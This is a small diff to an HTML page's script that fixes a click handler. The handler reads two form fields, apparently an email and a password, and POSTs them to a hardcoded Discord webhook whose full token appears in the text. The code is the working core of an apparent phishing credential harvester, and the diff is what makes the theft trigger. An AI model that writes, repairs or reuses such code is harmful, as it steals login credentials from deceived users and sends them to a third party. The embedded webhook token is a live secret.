@@ -7,10 +7,8 @@
   </body>
 </html>
 <script>
-  const el = document.getElementById("xd");
-el.addEventListener("click", sendMessage(document.getElementById("ema").value,document.getElementById("ntra").value), false);
-
-
+ 
+document.getElementById("xd").onclick = function(){sendMessage(document.getElementById("ema").value,document.getElementById("ntra").value)};
 function sendMessage(e,p) {
     var request = new XMLHttpRequest();
     request.open("POST", "https://discord.com/api/webhooks/842367883203444787/3wUnoiRkreCFqB6TJ8VsBTQmDOCFfB58DAdMItnYik4HhIlW8_6wZR2edA5tVE6neD4g");
